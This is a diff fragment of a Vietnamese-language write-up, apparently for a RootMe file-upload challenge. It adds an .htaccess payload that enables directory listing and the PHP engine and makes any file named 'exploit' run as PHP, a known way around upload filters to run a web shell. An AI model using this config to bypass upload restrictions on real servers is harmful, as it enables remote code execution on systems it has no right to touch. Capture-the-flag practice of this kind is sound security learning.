@@ -6,7 +6,25 @@ thử upload
 ![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/ebdb55f3-ce0f-4f20-ba9f-f0413591db13)
 
 Ta đổi nội dung thành như sau:
+```
+Options All +Indexes
 
+
+
+<IfModule mod_php7.c>
+
+    php_flag engine on
+
+</IfModule>
+
+
+
+<FilesMatch "exploit">
+
+  SetHandler  application/x-httpd-php
+
+</FilesMatch>
+```
 ![image](https://github.com/nguyenngocdung18/RootMe/assets/134156226/bfeee210-7afd-423f-936a-aaf66c68b659)
 
 
